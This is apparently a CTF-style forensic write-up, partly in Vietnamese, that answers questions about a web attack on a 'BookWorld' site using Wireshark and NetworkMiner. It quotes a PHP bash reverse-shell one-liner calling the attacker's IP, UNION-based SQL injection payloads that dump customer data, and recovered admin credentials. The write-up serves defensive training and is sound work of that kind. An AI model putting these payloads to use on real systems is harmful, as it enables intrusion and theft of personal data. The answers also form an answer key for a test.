# Web Investigation

> As the lead analyst on this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

> Tools:

>    Wireshark , Network Miner


## Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

+ để checking toàn diện về tiếp bị trong traffic network => conversations

=> 2 ip này đang giao tiếp với nhau nhiều nhất để sâu hơn ta sẽ check tcp connection của nó 

  ![image](https://github.com/user-attachments/assets/75c7980a-0cef-460e-908e-e91f1a26e3d4)

+ để điều tra ta có attacker có vẻ đang khai thác 1 số lỗ hổng như : sql injection , file uploads , fuzz dns

      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>

=> đây là file NVri2vhp.php đã upload script có vẻ đang tạo kết nối tcp listen tại host 111.224.250.131 => file upload vuln 

![image](https://github.com/user-attachments/assets/635e933f-4da7-4366-9337-c97a9a8714e0)

=> Anwser: 111.224.250.131

## Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

=> dùng iplocation lookup : check với ip 111.224.250.131

![image](https://github.com/user-attachments/assets/04d75a0b-17b4-490e-ae0f-121d18d21f21)

=> City: Shijiazhuang

## Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable script name?

+ xác định vị trí của script bị inject vào param có thể gây ra lỗ hổng

![image](https://github.com/user-attachments/assets/4dd94621-6c89-463f-98e1-aed216e92575)

=> ta có thể thấy vị trí trên URI đó là search.php?search=' đang test lỗ hổng sql => respond 500 server 

=> Anwser: search.php 

## Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the first SQLi attempt by the attacker?

+ xác định lần tấn công đầu tiên trả về respond 200 OK => /search.php?search=book%20and%201=1;%20--%20-

![image](https://github.com/user-attachments/assets/f9250720-75b7-43c2-b3e0-ec432d8a36d1)

=> Anwser: /search.php?search=book%20and%201=1;%20--%20- 

## Q5: Can you provide the complete request URI that was used to read the web server available databases?

=> câu này hiểu xem sqli có thể extract URi có thê web server available databases injection vào param   

![image](https://github.com/user-attachments/assets/081be448-c9da-4fe0-a13b-a2bc8b7acda3)

```/search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-```

=> Anwser: /search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-

## Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?

+ table name chứa users data là customers truy vấn ra tài khoản của website 

![image](https://github.com/user-attachments/assets/80ba8f67-c0c6-4fee-b95a-0ece62281721)

    book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- -

=> Anwser: customers

## Q7: The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide name of the directory discovered by the attacker?

+ attacker đã tìm kiếm trong directory admin nơi mà chứa các thông tin mật như username, password của user cũng như admin

![image](https://github.com/user-attachments/assets/2408f3e6-56c7-4458-915a-6e64b5c5e180)

=> Answer: /admin/

## Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What's the credentials used by the attacker for logging in?

> network Minner tập trung vào việc trích xuất và phân bố những dữ liệu cụ thể từ các gói tin

![image](https://github.com/user-attachments/assets/f5cf8cf7-fe47-4891-95f8-16266c1b8ef2)

> ta thấy credentials atttacker là  username admin và password admin123! được sử dụng cuối cùng và sau đó kẻ tấn công đã truy cập được vào

=> admin:admin123!

## Q9: We need to determine if the attacker gained further access or control on our web server. What's the name of the malicious script uploaded by the attacker?

+ Như mình đã tìm được ở Q1 thì file được upload lên là NVri2vhp.php nhằm tạo backdoor để sử dụng các câu lệnh từ xa

![image](https://github.com/user-attachments/assets/a01b58ed-bbfe-4935-b943-e7f99b0e8285)

=> Answer: NVri2vhp.php
